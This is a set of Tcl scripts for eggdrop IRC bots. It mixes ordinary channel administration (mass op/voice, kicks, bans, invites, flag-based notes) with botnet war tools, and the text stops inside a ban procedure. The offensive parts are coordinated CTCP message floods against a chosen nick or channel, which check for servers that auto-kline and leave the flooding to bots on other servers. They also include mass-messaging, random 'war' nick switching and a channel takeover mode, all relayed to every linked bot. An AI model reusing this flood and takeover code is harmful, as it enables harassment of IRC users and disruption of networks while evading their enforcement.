bind dcc o versions tcl_versions

proc send_tclversion { bot command idx } {
   global version tclVersion varsVersion
   if {[matchattr $bot bo]} { catch {putbot $bot "mytclversion $idx [sindex $version 0] $tclVersion $varsVersion"} }
}
bind bot - tclversion send_tclversion

proc received_tclversion { bot command args } {
   set args [lindex $args 0]
   set idx [sindex $args 0] ; set botv [sindex $args 1] ; set maintcl [sindex $args 2] ; set vars [sindex $args 3]
   if {![valididx $idx]} { return }
   if {$vars == ""} { set vars "(unknown)" }
   putdcc $idx " - BIN:v$botv     TCL:$maintcl     VARS:$vars  ...  \002$bot\002"
}
bind bot - mytclversion received_tclversion

####################################################################################
####################################################################################



####################################################################################
####################################################################################
# Flagnote.tcl (found this at ftp.sodre.net)

# Add any user-defined flags here, leaving one space between each flag:
set newglobalflags "T W S v g"
set newchanflags   "v g 0"

############### [~] Do Not Change Anything Below This Line [~] ###############

# as of eggdrop 1.1.4:
set globalflags "B c d f j k m n o p u x"
set chanflags   "d f k m n o"
set botflags    "a b h l r s"

bind dcc m flagnote dcc_flagnote
proc dcc_flagnote {hand idx arg} {
   global newglobalflags newchanflags globalflags chanflags botflags
   set whichflag [sindex $arg 0]
   if {[string index [sindex $arg 1] 0] == "#"} {
      set toglobal 0
      set tochannel 1
      set channel "[sindex $arg 1]"
      if {[lsearch [string tolower [channels]] [string tolower $channel]] == -1} {
         putdcc $idx "I am not monitoring channel $channel, sorry."
         return 0
      }
      set message [srange $arg 2 end]
   } elseif {[string tolower [sindex $arg 1]] == "all"} {
      set toglobal 1
      set tochannel 1
      set channel "[channels]"
      set message [srange $arg 2 end]
   } {
      set toglobal 1
      set tochannel 0
      set channel ""
      set message [srange $arg 1 end]
   }
   if {$whichflag == "" || $message == ""} {
      putdcc $idx "Usage: flagnote <\[+\]flag> \[#channel/all\] <message>"
      putdcc $idx "  Sends <message> to users with given channel or global flag."
      putdcc $idx "  If '#channel' is specified, message goes to users with channel"
      putdcc $idx "  <flag> for channel #channel. If 'all' is specified, message"
      putdcc $idx "  goes to users with either any channel or global <flag>."
      putdcc $idx "  Otherwise message will go only to users with global <flag>."
      putdcc $idx "  A %nick in message to be replaced with destination handle."
      return 0
   }
   if {[string index $whichflag 0] == "+"} {
      set whichflag [string index $whichflag 1]
   }
   if {([lsearch -exact $botflags $whichflag] > 0)} {
      putdcc $idx "The flag \[\002$whichflag\002\] is for bots only."
      putdcc $idx "Choose from the following: \002[lsort [concat $globalflags $newglobalflags]]\002"
      return 0
   }
   if {[lsearch -exact [concat $globalflags $newglobalflags] $whichflag] < 0} {
      putdcc $idx "The flag \[\002$whichflag\002\] is not a defined flag."
      putdcc $idx "Choose from the following: \002[lsort [concat $globalflags $newglobalflags]]\002"
      return 0
   }
   if {$tochannel && $toglobal} {
      putcmdlog "#$hand# flagnote \[+$whichflag\] all ..."
      putdcc $idx "*** Sending FlagNote to all \[\002$whichflag\002\] users."
      set channel [channels]
   } elseif {$tochannel && !$toglobal} {
      putcmdlog "#$hand# flagnote \[+$whichflag $channel\] ..."
      putdcc $idx "*** Sending FlagNote to all \[\002$whichflag\002\] users ($channel)."
   } {
      putcmdlog "#$hand# flagnote \[+$whichflag\] ..."
      putdcc $idx "*** Sending FlagNote to all global \[\002$whichflag\002\] users."
   }
   if {[lsearch -exact [concat $newchanflags $chanflags] $whichflag] < 0 && $tochannel} {
      putdcc $idx "*** \[\002$whichflag\002\] is a global only flag."
   }
   set message \[\002$whichflag\002\]\ $message
   set notes 0
   foreach user [userlist] {
      if {![matchattr $user b]} {
         if {[matchattr $user $whichflag] && $toglobal && !$tochannel && ![strcmp $user $hand]} {
            regsub -all "%nick" $message "$user" tmpmessage
            sendnote $hand $user $tmpmessage
            incr notes
            continue
         }
         if {$tochannel} {
            foreach chan [split $channel] {
               if {[matchchanattr $user $whichflag $chan] && ![strcmp $user $hand]} {
                  regsub -all "%nick" $message "$user" tmpmessage
                  sendnote $hand $user $tmpmessage
                  incr notes
                  break
               }
            }
         }
      }
   }
   if {$notes == 1} {set notes "\0021\002 note was"} {set notes "\002$notes\002 notes were"}
   putdcc $idx "*** Done.  $notes sent."
}



######################################################################################
##  Mass Modes/Channel Protection TCL
##  Author - [T3]
######################################################################################

proc mass_mode { plusminus mode queue channel nicknames } {
   global modes-per-line
   set count 0 ; set nicks "" ; set nummodes ""
   set max-modes [llength $nicknames]
   foreach 1nick $nicknames {
      incr count
      append nicks "$1nick "
      append nummodes $mode
      if {[expr $count % ${modes-per-line}] == 0 || $count >= ${max-modes}} {
         $queue "MODE $channel $plusminus$nummodes [string range $nicks 0 [expr [string length $nicks]-2]]"
         set nicks "" ; set nummodes ""
      }
   }
}

proc mass_deop { handle idx args } {
   global botnick
   set args [lindex $args 0]
   if {$args == ""} { putdcc $idx "\002Usage:\002 .massdeop <channel>" ; return }
   putcmdlog "#$handle# massdeop $args"
   set channel [sindex $args 0]
   if {![validchan $channel]} { putdcc $idx "Unable to mass deop \002$channel\002 - invalid channel." ; return }
   if {![botisop $channel]} { putdcc $idx "Unable to mass deop \002$channel\002 - not opped." ; return }
   foreach 1user [string tolower [chanoplist $channel]] {
      if {![validop [nick2hand $1user $channel] $channel] && $1user != [string tolower $botnick]} { lappend deopnicks $1user }
   }
   if {![info exists deopnicks] || ([llength $deopnicks] < 1)} {
      putdcc $idx "*** No action taken; no one to deop on \002$channel\002." ; return
   }
   mass_mode - o putserv $channel [scramble $deopnicks]
   putdcc $idx "*** \002[llength $deopnicks]\002 non-op(s) were deopped on $channel."
}
bind dcc n massdeop mass_deop

proc mass_voice { handle idx args } {
   set args [lindex $args 0]
   putcmdlog "#$handle# massvoice $args"
   if {$args == ""} { putdcc $idx "\002Usage:\002 .massvoice <channel>" ; return }
   set channel [sindex $args 0]
   if {![validchan $channel]} { putdcc $idx "Unable to mass voice \002$channel\002 - invalid channel." ; return }
   if {![botisop $channel]} { putdcc $idx "Unable to mass voice \002$channel\002 - not opped." ; return }
   foreach 1user [string tolower [chanlist $channel]] {
      if {![isvoice $1user $channel] && ![isop $1user $channel]} { lappend vnicks $1user }
   }
   if {![info exists vnicks] || ([llength $vnicks] < 1)} {
      putdcc $idx "*** No action taken; everyone on \002$channel\002 is either opped or voiced." ; return
   }
   mass_mode + v putserv $channel [scramble $vnicks]
   putdcc $idx "*** \002[llength $vnicks]\002 user(s) were voiced on $channel."
}
bind dcc m massvoice mass_voice

proc mass_devoice { handle idx args } {
   set args [lindex $args 0]
   putcmdlog "#$handle# massdevoice $args"
   if {$args == ""} { putdcc $idx "\002Usage:\002 .massdevoice <channel>" ; return }
   set channel [sindex $args 0]
   if {![validchan $channel]} { putdcc $idx "Unable to mass devoice \002$channel\002 - invalid channel." ; return }
   if {![botisop $channel]} { putdcc $idx "Unable to mass devoice \002$channel\002 - not opped." ; return }
   foreach 1user [string tolower [chanlist $channel]] {
      if {[isvoice $1user $channel] && ![isop $1user $channel]} { lappend dvnicks $1user }
   }
   if {![info exists dvnicks] || ([llength $dvnicks] < 1)} {
      putdcc $idx "*** No action taken; no one on \002$channel\002 is voiced." ; return
   }
   mass_mode - v putserv $channel [scramble $dvnicks]
   putdcc $idx "*** \002[llength $dvnicks]\002 user(s) were de-voiced on $channel."
}
bind dcc m massdevoice mass_devoice

proc fast_masskick { handle idx args } {
   global botnick
   set args [lindex $args 0]
   set numkicks 4
   set reason "Mass Kick"
   if {[valididx $idx]} {
      putcmdlog "#$handle# masskick $args"
      if {$args == ""} { putdcc $idx "\002Usage:\002 .masskick <channel> \[modes\] \[reason\]" ; return }
   }
   if {[sindex $args 1] != "" && [sindex $args 1] > 0 && [sindex $args 1] < 1000000 && 
       [string tolower [sindex $args 1]] != "all"} { set numkicks [sindex $args 1] }
   if {[srange $args 2 end] != "" && $numkicks == [sindex $args 1]} {
      set reason [srange $args 2 end]
   } elseif {[srange $args 1 end] != ""} { set reason [srange $args 1 end] }
   set channel [sindex $args 0]
   if {$idx == "Shutdown"} { putallbots "masskick $channel $numkicks $reason" }
   if {[valididx $idx]} {
      putallbots "masskick $channel $numkicks $reason"
      if {![validchan $channel]} { putdcc $idx "Unable to mass kick \002$channel\002 - invalid channel." ; return }
      if {![onchan $botnick $channel]} { putdcc $idx "Unable to mass kick \002$channel\002 - not on channel." ; return }
      if {![botisop $channel]} { putdcc $idx "Unable to mass kick \002$channel\002 - not opped." ; return }
   }
   if {![valididx $idx] && (![validchan $channel] || ![botisop $channel] || ![onchan $botnick $channel])} { return }
   set type [string tolower [sindex $args 1]] ; set kickcount 0 ; set nickcount 0 ; set element 0
   foreach 1nick [scramble [chanlist $channel]] {
      set uhand [nick2hand $1nick $channel]
      if {[isop $1nick $channel] && $type != "all"} { continue }
      if {[validop $uhand $channel] || [onchansplit $1nick $channel] || [matchattr $uhand g] || [matchchanattr $uhand g $channel]} { continue }
      if {$nickcount >= $numkicks} { 
         set mkicklist($element) [string trimright $mkicklist($element) ","]
         incr element
         set nickcount 0
      }
      append mkicklist($element) "$1nick,"
      incr nickcount
      incr kickcount
   }
   if {[valididx $idx]} {
      if {$kickcount < 1} {
         if {[string tolower [sindex $args 1]] != "all"} {
            putdcc $idx "*** No action taken, everyone on \002$channel\002 is either +o or already opped."
         } else { putdcc $idx "*** No action taken, everyone on \002$channel\002 is +o." }
         return
      } else { putdcc $idx "*** Kicking \002$kickcount\002 user(s) from $channel. ($numkicks-kick interval)" }
   }
   if {![string match "*i*" [sindex [getchanmode $channel] 0]]} { putserv "MODE $channel +i" }
   set kickssent 0
   foreach 1kick [array names mkicklist] {
      incr kickssent
      if {$kickssent > 5} { setutimer 10 "fast_masskick [str2tcl $handle] recurse \"[str2tcl $channel] $numkicks [str2tcl $reason]\"" ; return }
      putserv "KICK $channel $mkicklist($1kick) :$reason"
   }
}
bind dcc m masskick fast_masskick

proc net_masskick { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   fast_masskick - - "[sindex $args 0] [sindex $args 1] [srange $args 2 end]"
}
bind bot - masskick net_masskick

proc select_masskick { handle idx args } {
   set args [lindex $args 0]
   set hostmask [string tolower [sindex $args 0]] ; set channel [sindex $args 1] ; set reason [srange $args 2 end]
   putcmdlog "#$handle# skick $args"
   if {$channel == ""} { putdcc $idx "\002Usage:\002 .skick <hostmask> <channel> \[reason\]" ; return }
   if {![string match *!*@* $hostmask]} { putdcc $idx "Invalid hostmask - must be of the form:  nick!ident@host" ; return }
   if {![validchan $channel]} { putdcc $idx "Invalid channel" ; return }
   if {![botisop $channel]} { putdcc $idx "Unable to selectively mass kick $channel - not opped." ; return }
   if {$reason == ""} { set reason "and don't come back ..." }
   set user [finduser $hostmask]
   if {[validop $user $channel] || [matchattr $user g] || [matchchanattr $user g $channel]} {
      putdcc $idx "*** That hostmask matches the host for \002$user\002." ; return
   }
   set numkicks 4 ; set kickcount 0 ; set nickcount 0 ; set element 0
   foreach 1nick [chanlist $channel] {
      set hand [nick2hand $1nick $channel]
      set host [string tolower "$1nick![getchanhost $1nick $channel]"]
      if {![string match [str2tcl $hostmask] $host]} { continue }
      if {[isop $1nick $channel] || [onchansplit $1nick $channel] || [validop $hand $channel]} { continue }
      if {[matchattr $hand g] || [matchchanattr $hand g $channel]} { continue }
      if {$nickcount >= $numkicks} {
         set mkicklist($element) [string trimright $mkicklist($element) ","]
         incr element
         set nickcount 0
      }
      append mkicklist($element) "$1nick,"
      incr nickcount
      incr kickcount
   }
   if {$kickcount < 1} {
      putdcc $idx "No action taken; everyone on \002$channel\002 is either +o/+g or already opped."
      return
   }
   putdcc $idx "*** Selectively kicking \002$kickcount\002 user(s) from $channel."
   if {![string match "*i*" [sindex [getchanmode $channel] 0]]} { putserv "MODE $channel +i" }
   foreach 1kick [array names mkicklist] { putserv "KICK $channel $mkicklist($1kick) :$reason" }
}
bind dcc m skick select_masskick
bind dcc m selectkick select_masskick
bind dcc m selectmasskick select_masskick

proc takeover { handle idx args } {
   global takeover
   set channels [string tolower [lindex $args 0]]
   putcmdlog "#$handle# takeover $channels"
   if {$channels == ""} { putdcc $idx "\002Usage:\002 .takeover <channel1> \[channel2\] ..." ; return }
   foreach 1chan [split $channels] { set takeover($1chan) 1 }
   putdcc $idx "*** Takeover mode initiated for:  $channels"
   dccbroadcast "Takeover mode initiated by \002$handle\002 for:  $channels"
}
bind dcc n takeover takeover
bind dcc n take takeover

proc no_takeover { handle idx args } {
   global takeover
   set channels [string tolower [lindex $args 0]]
   putcmdlog "#$handle# notakeover $channels"
   if {$channels == ""} { putdcc $idx "\002Usage:\002 .notakeover <channel1> \[channel2\] ..." ; return }
   foreach 1chan [split $channels] { catch {unset takeover($1chan)} }
   putdcc $idx "*** Takeover mode halted for:  $channels"
   dccbroadcast "Takeover mode halted by \002$handle\002 for:  $channels"
}
bind dcc n notakeover no_takeover
bind dcc n notake no_takeover

proc mass_msg { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# massmsg $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == ""} { putdcc $idx "\002Usage:\002 .massmsg <nick|chan> \[text\]" ; return }
   set msgnick [sindex $args 0]
   set msgtext "MASS MSG MASS MSG MASS MSG MASS MSG MASS MSG MASS MSG MASS MSG"
   if {[sindex $args 1] != ""} { set msgtext [srange $args 1 end] }
   putserv "PRIVMSG $msgnick :$msgtext"
   putallbots "massmsg $handle $msgnick $msgtext"
   putdcc $idx "*** Mass message to \002$msgnick\002 initiated ..."
}
bind dcc n massmsg mass_msg

proc net_massmsg { bot command args } {
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   putserv "PRIVMSG [sindex $args 1] :[srange $args 2 end]"
   putlog "\[\002MASSMSG\002\] Mass messaging \002[sindex $args 1]\002"
   putlog " - Authorized by [sindex $args 0]@$bot"
}
bind bot - massmsg net_massmsg

proc mass_nickchange { handle idx args } {
   global nick keep-nick nick_changes group
   set args [lindex $args 0]
   if {[valididx $idx]} {
      putcmdlog "#$handle# changenicks $args"
      if {![matchattr $nick boT]} { noflag $idx ; return }
   }
   if {![info exists nick_changes]} { set nick_changes 0 }
   if {$nick_changes > 2} {
      if {[valididx $idx]} { putdcc $idx "*** Too many nick changes.  Please wait another minute." }
      return
   }
   incr nick_changes
   setutimer 60 "catch {unset nick_changes}"
   set keep-nick "-1"
   if {$args == ""} {
      set randend ""
      for {set j 0} {$j < [expr [string length $nick] / 2]} {incr j} {
         set x [rand 64]
         append randend [string range "_`0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" $x $x]
      }
      set randnick "[string range $nick 0 [expr [string length $nick] - ([string length $nick] / 2) - 1]]$randend"
   } else {
      if {$group == "950" || $group == "WiN"} {
         if {[valididx $idx]} {
            putdcc $idx "*** Due to the way hosts are handled in $group, this kind of nick-change is not allowed."
            putdcc $idx "  - Use '.changenicks' instead."
         }
         return
      }
      set randend ""
      for {set j 0} {$j < 9} {incr j} {
         set x [rand 64]
         append randend [string range "_`0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" $x $x]
      }
      set randnick "$args[string range $randend 0 [expr 8 - [string length $args]]]"
   }
   dumpserv "NICK $randnick"
   if {[valididx $idx]} {
      putallbots "randomnick $args"
      putdcc $idx "*** Initiating botnet nick-change ..."
      putdcc $idx "*** Switching to random nick:  $randnick"
      dccputchan 5 "\[\002NICK\002\] Switching to random nick:  $randnick"
      dccputchan 5 " - Authorized by $handle@$nick"
      return
   } else { putlog "\[\002NICK\002\] Switching to random nick:  $randnick" }
   dccputchan 5 "\[\002NICK\002\] Switching to random nick:  $randnick"
}
bind dcc n changenicks mass_nickchange

proc net_nickchange { bot command args } {
   if {[matchattr $bot boT]} { mass_nickchange - - [sindex [lindex $args 0] 0] }
}
bind bot - randomnick net_nickchange

proc war_nicks { handle idx args } {
   global nick keep-nick nick_changes
   if {[valididx $idx]} {
      putcmdlog "#$handle# warnicks"
      if {![matchattr $nick boT]} { noflag $idx ; return }
      putallbots "warnicks $handle"
      putdcc $idx "*** Switching to a random jupe nick ..."
   } else {
      putlog "\[\002WARNICKS\002\] Switching to a random jupe nick ..."
      putlog " - Authorized by $handle@[sindex [lindex $args 0] 0]"
   }
   if {![info exists nick_changes]} { set nick_changes 0 }
   if {$nick_changes > 2} {
      if {[valididx $idx]} { putdcc $idx "*** Too many nick changes.  Please wait another minute." }
      return
   }
   setutimer 60 "set nick_changes 0"
   set keep-nick "-1"
   set randchar [string index "abcdefghijklmnopqrstuvwxyz" [rand 26]]
   if {[rand 3] == 1} { set randchar "" }
   incr nick_changes
   dumpserv "NICK [string range $nick 0 6]\\$randchar"
}
bind dcc n warnicks war_nicks

proc net_warnicks { bot command args } {
   if {[matchattr $bot boT]} { war_nicks [sindex [lindex $args 0] 0] - $bot }
}
bind bot - warnicks net_warnicks

proc reset_nicks { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# resetnicks $args"
   if {$args == ""} { putdcc $idx "\002Usage:\002 .resetnicks <*|bots>" ; return }
   if {$args == "*"} {
      putdcc $idx "*** Resetting botnet nicks ..."
      dumpserv "NICK $nick"
      putallbots "resetnicks $handle"
   } else {
      putdcc $idx "*** Resetting botnet nicks for:  $args"
      foreach 1bot [split $args] { catch {putbot $1bot "resetnicks $handle"} }
   }
}
bind dcc n resetnicks reset_nicks

proc net_resetnicks { bot command args } {
   global nick
   if {![matchattr $bot bo]} { return }
   putlog "\[\002RESET\002\] Switching back to normal nickname - (authorized by [lindex $args 0]@$bot)"
   dumpserv "NICK $nick"
}
bind bot - resetnicks net_resetnicks

proc flood_start { handle idx args } {
   global nick server klineservers flooding floodtarget floodtext
   set args [lindex $args 0]
   putcmdlog "#$handle# flood $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == ""} { putdcc $idx "\002Usage:\002 .flood <nick|chan> \[type\] \[duration\]" ; return }
   if {[info exists flooding] && $flooding} {
      putdcc $idx "\[\002ALERT\002\] A flood is already in progress.  Please wait for it to terminate ..."
      putdcc $idx " - You may use .floodstop to halt all active floods."
      return
   }
   set floodtarget "[sindex $args 0]"
   set floodtext "CLIENTINFO"
   set floodtime 0
   if {[sindex $args 1] != ""} { set floodtext [string toupper [sindex $args 1]] }
   if {[sindex $args 2] != "" && [sindex $args 2] > 0} {
      set floodtime [sindex $args 2]
      setutimer $floodtime kill_flood
   }
   foreach 1server $klineservers {
      if {[string match *[string tolower $1server]* [string tolower $server]]} { set noflood "" }
   }
   putdcc $idx "\[\002FLOOD\002\] CTCP $floodtext flood on \002$floodtarget\002 initiated ..."
   if {![info exists noflood]} {
      set flooding 1
      repeat_flood
   } else {
      putdcc $idx "\[\002ALERT\002\] The current server ($server) auto-klines for CTCP flooding"
      putdcc $idx " - Ordering all \037other\037 bots to proceed with flood"
   }
   putallbots "massctcp $handle $floodtarget $floodtext $floodtime"
}
bind dcc n flood flood_start

proc net_massctcp { bot command args } {
   global server klineservers flooding floodtarget floodtext
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set floodtarget [sindex $args 1] ; set floodtext [sindex $args 2]
   if {[sindex $args 3] != 0} { setutimer [sindex $args 3] kill_flood }
   foreach 1server $klineservers {
      if {[string match *[string tolower $1server]* [string tolower $server]]} { set noflood "" }
   }
   putlog "\[\002FLOOD\002\] CTCP $floodtext flood initiated on \002$floodtarget\002"
   putlog " - Authorized by [sindex $args 0]@$bot"
   if {![info exists noflood]} {
      set flooding 1
      repeat_flood
   } else {
      putlog "\[\002ALERT\002\] Current server ($server) auto-klines for CTCP flooding"
      putlog " - No action taken"
   }
}
bind bot - massctcp net_massctcp

proc repeat_flood {} {
   global floodtarget floodtext
   if {![info exists floodtarget] || ![info exists floodtext]} { return }
   putserv "PRIVMSG $floodtarget :$floodtext"
   putserv "PRIVMSG $floodtarget :$floodtext"
   putserv "PRIVMSG $floodtarget :$floodtext"
   putserv "PRIVMSG $floodtarget :$floodtext"
   setutimer 10 repeat_flood
}

proc killall_flood { handle idx args } {
   if {[valididx $idx]} { putcmdlog "#$handle# floodstop" }
   kill_flood
   putallbots "floodstop"
}
bind dcc n floodstop killall_flood

proc killmy_flood { bot command args } {
   if {[matchattr $bot bo]} { kill_flood }
}
bind bot - floodstop killmy_flood

proc kill_flood {} {
   global flooding floodtarget floodtext
   kill_utimer repeat_flood
   set flooding 0
   catch {unset floodtarget} ; catch {unset floodtext}
   putlog "\[\002FLOOD\002\] All active floods have terminated."
}

proc global_op { handle idx args } {
   set ops [lindex $args 0]
   putcmdlog "#$handle# globalOp $ops"
   if {$ops == ""} { putdcc $idx "\002Usage:\002 .gop <nick1> \[nick2\] ..." ; return }
   putdcc $idx "*** Opping '$ops' on all authorized channels ..."
   foreach 1chan [channels] {
      if {![botisop $1chan]} { continue }
      foreach 1op [split $ops] {
         if {[onchan $1op $1chan] && $handle != [nick2hand $1op $1chan]} {
            putdcc $idx "You may only op yourself through the bots." ; break
         }
         secureOp $1op $1chan
      }
   }
}
bind dcc m globalop global_op
bind dcc m gop global_op

proc global_deop { handle idx args } {
   set ops [lindex $args 0]
   putcmdlog "#$handle# globalDeop $ops"
   if {$ops == ""} { putdcc $idx "\002Usage:\002 .gdeop <nick1> \[nick2\] ..." ; return }
   putdcc $idx "*** De-opping '$ops' on all channels ..."
   foreach 1chan [channels] {
      if {![botisop $1chan]} { continue }
      set deopnicks {}
      foreach 1op [split $ops] {
         if {[isop $1op $1chan]} { lappend deopnicks $1op }
      }
      mass_mode - o dumpserv $1chan $deopnicks
   }
}
bind dcc m globaldeop global_deop
bind dcc m gdeop global_deop

proc global_kick { handle idx args } {
   set users [lindex $args 0]
   if {[valididx $idx]} {
      putcmdlog "#$handle# globalKick $users"
      if {$users == ""} { putdcc $idx "\002Usage:\002 .gkick <nick1> \[nick2\] ..." ; return }
      putdcc $idx "*** Kicking '$users' from all channels ..."
   } else { putlog "*** Kicking '$users' from all channels ..." }
   foreach 1chan [channels] {
      if {![botisop $1chan]} { continue }
      foreach 1user [split $users] {
         if {[onchan $1user $1chan] && ![onchansplit $1user $1chan]} { putserv "KICK $1chan $1user :Requested" }
      }
   }
}
bind dcc m globalkick global_kick
bind dcc m gkick global_kick

proc global_kickban { handle idx args } {
   set users [lindex $args 0]
   if {[valididx $idx]} {
      putcmdlog "#$handle# globalKickBan $users"
      if {$users == ""} { putdcc $idx "\002Usage:\002 .gkickban <nick1> \[nick2\] ..." ; return }
      putdcc $idx "*** Kick-banning '$users' on all channels ..."
   } else { putlog "*** Kick-banning '$users' on all channels ..." }
   foreach 1chan [channels] {
      if {![botisop $1chan]} { continue }
      foreach 1user [split $users] {
         if {![onchan $1user $1chan] || [onchansplit $1user $1chan]} { continue }
         set host [getchanhost $1user $1chan]
         if {$host == ""} { putdcc $idx "*** Failed to find host for $1user on $1chan." ; continue }
         regsub "\\*!" [maskhost $host] "\*!\*" ban
         putserv "MODE $1chan +b [fixhost $ban $1chan]"
         putserv "KICK $1chan $1user :Requested"
      }
   }
}
bind dcc m globalkickban global_kickban
bind dcc m gkickban global_kickban
bind dcc m mban global_kickban

proc do_kick { idx arg } {
   set handle [idx2hand $idx]
   set command [string range [sindex $arg 0] 1 end]
   if {(![strcmp $command kick] && ![strcmp $command kickban]) || (![matchattr $handle o] && ![matchattr $handle g])} { return $arg }
   putcmdlog "#$handle# [string range $arg 1 end]"
   if {[sindex $arg 1] == ""} { putdcc $idx "\002Usage:\002 .$command \[channel\] <nick> \[reason\]" ; return }
   if {[string index [sindex $arg 1] 0] == "#" || [string index [sindex $arg 1] 0] == "&"} {
      set channel [sindex $arg 1]
      set nick [sindex $arg 2]
      set reason [srange $arg 3 end]
   } else {
      set channel [sindex [console $idx] 0]
      set nick [sindex $arg 1]
      set reason [srange $arg 2 end]
   }
   if {$reason == ""} { set reason "Requested" }
   if {![validchan $channel]} { putdcc $idx "Invalid channel ($channel)" ; return }
   if {![botisop $channel]} { putdcc $idx "I can't help you now because I'm not a channel op on $channel." ; return }
   if {([matchattr $handle g] || [matchchanattr $handle g $channel]) && [validop [nick2hand $nick $channel] $channel]} {
      putdcc $idx "$nick is a registered op." ; return
   }
   if {[strcmp $command kickban]} {
      set host [getchanhost $nick $channel]
      if {$host == ""} { putdcc $idx "*** Failed to find host for $nick on $channel" ; return }
      regsub "\\*!" [maskhost $host] "\*!\*" ban
      putserv "MODE $channel +b [fixhost $ban $channel]"
   }
   putserv "KICK $channel $nick :$reason"
   return
}
bind filt - ".kick*" do_kick

proc global_invite { handle idx args } {
   global mainchan
   if {[matchattr $handle d]} { putdcc $idx "What?  You need '.help'" ; return }
   set users [lindex $args 0]
   putcmdlog "#$handle# globalInvite $users"
   if {$users == ""} { putdcc $idx "\002Usage:\002 .ginvite <nick1> \[nick2\] ..." ; return }
   putdcc $idx "*** Inviting '$users' to all authorized +i channels ..."
   foreach 1user [split $users] {
      foreach 1chan [channels] {
         if {[botisop $1chan] && (![onchan $1user $1chan] || [onchansplit $1user $1chan]) && 
             [string match *i* [sindex [getchanmode $1chan] 0]]} {
            dumphelp "INVITE $1user $1chan"
            set invited ""
         }
      }
   }
   if {![info exists invited]} {
      putdcc $idx "\[\002ERROR\002\] No action taken.  Possible reasons:"
      putdcc $idx "  1. Specified nicks are already on all the +i channels I monitor."
      putdcc $idx "  2. I am not opped."
      putdcc $idx " "
   }
}
bind dcc o globalinvite global_invite
bind dcc o ginvite global_invite

proc invite_me { handle idx args } {
   if {[matchattr $handle d]} { putdcc $idx "What?  You need '.help'" ; return }
   putcmdlog "#$handle# inviteme"
   set nick ""
   set host [string tolower [idx2host $idx]]
   if {$host == ""} { putdcc $idx "Invalid partyline host (?)" ; return }
   foreach 1chan [channels] {
      foreach 1nick [chanlist $1chan op] {
         if {[string tolower [getchanhost $1nick $1chan]] != $host} { continue }
         if {$nick == ""} {
            set nick $1nick
         } elseif {$nick != $1nick} {
            putdcc $idx "*** Unable to globally invite you:  multiple nicks match your partyline host ($nick, $1nick)" ; return
         }
      }
   }
   if {$nick == ""} {
      putdcc $idx "*** Failed to locate your nickname on IRC"
      putdcc $idx " - Check your host on the partyline, or use .ginvite instead."
      return
   }
   foreach 1chan [channels] {
      if {[botisop $1chan] && (![onchan $nick $1chan] || [onchansplit $nick $1chan]) && 
          [string match *i* [sindex [getchanmode $1chan] 0]]} {
         dumphelp "INVITE $nick $1chan"
         set invited ""
      }
   }
   if {![info exists invited]} {
      putdcc $idx "\[\002ERROR\002\] No action taken.  Possible reasons:"
      putdcc $idx "  1. You are already on all the +i channels I monitor."
      putdcc $idx "  2. I am not opped."
      putdcc $idx " "   
   }
}
bind dcc o inviteme invite_me

proc scan_banlist { host args } {
   set idx [lindex $args 0] ; set host [string tolower $host]
   if {$host == ""} { return 0 }
   if {[regexp \[^!-~\] $host]} {
      if {[valididx $idx]} { putdcc $idx "*** You may not ban hosts with foreign characters; use a wildcard instead." }
      return 0
   }
   foreach 1ban [string tolower [banlist]] {
      set ban [sindex $1ban 0]
      if {[strcmp $ban $host]} {
         if {[valididx $idx]} { putdcc $idx "*** That ban already exists." }
         return 0
      } elseif {[string match [str2tcl $ban] $host]} {
         if {[valididx $idx]} { putdcc $idx "*** A broader ban already exists in the banlist ($ban)." }
         return 0
      } elseif {[string match [str2tcl $host] $ban]} {
         killban $ban
         foreach 1chan [channels] {
            if {[isban $ban $1chan] && [killchanban $1chan $ban]} { continue }
            putserv "MODE $1chan -b $ban"
         }
      }
   }
   return 1
}

proc ban_host { handle idx args } {
   set args [lindex $args 0]
   if {[matchattr $handle d] || (![matchattr $handle o] && ![matchattr $handle g])} { putdcc $idx "What?  You need '.help'" ; return }
   putcmdlog "#$handle# +ban $args"
   set ban [sindex $args 0]
   set creator $handle
   if {$ban == ""} { putdcc $idx "\002Usage:\002 .+ban <hostmask> \[channel\] \[hours\] \[comment\]" ; return }
   if {![string match *!*@* $ban]} { putdcc $idx "Invalid ban - hostmask must be of the form:  nick!ident@host" ; return }
   if {[string index [sindex $args 1] 0] == "#"} {
      set channel [sindex $args 1]
      set ban [fixhost $ban $channel]
      if {![scan_banlist $ban $idx]} { return }
      if {![validchan $channel]} { putdcc $idx "No such channel." ; return }
      set lifetime [sindex $args 2]
      if {$lifetime == "" || $lifetime < 0 || $lifetime > 1000000} {
         set lifetime 0
         set comment [srange $args 2 end]            
      } else {
         set lifetime [expr $lifetime * 60]
         set comment [srange $args 3 end]
      }
      if {$comment == ""} { set comment "Requested" }
      if {$lifetime == 0} {
         putdcc $idx "*** Permanently banning '$ban' from $channel ..."
         newchanban $channel $ban $creator $comment $lifetime
         putallbots "chanban $handle $ban $channel $lifetime $comment"
      } else {
         putdcc $idx "*** Now banning '$ban' for \002[expr $lifetime / 60]\002 hour(s) on $channel ..."
         newchanban $channel $ban $creator $comment $lifetime
      }
   } else {
      set lifetime [sindex $args 1]
      if {$lifetime == "" || $lifetime < 0 || $lifetime > 1000000} {
         set lifetime 0
         set comment [srange $args 1 end]
      } else {
         set lifetime [expr $lifetime * 60]
         set comment [srange $args 2 end]
      }
      if {$comment == ""} { set comment "Requested" }
      set ban [fixhost $ban [lindex [channels] 0]]
      if {![scan_banlist $ban $idx]} { return }
      if {$lifetime == 0} {
         putdcc $idx "*** Permanently banning '$ban' from all channels ..."
         newban $ban $creator $comment $lifetime
         putallbots "ban $handle $ban $lifetime $comment"
      } else {
         putdcc $idx "*** Now banning '$ban' for \002[expr $lifetime / 60]\002 hour(s) from all channels ..."
         newban $ban $creator $comment $lifetime
      }
   }
}
unbind dcc - +ban *dcc:+ban
bind dcc - +ban ban_host

proc global_ban { bot command args } {
   if {![matchattr $bot bo]} { return }
   set args [lindex $args 0]
   if {[sindex $args 1] == ""} { return }
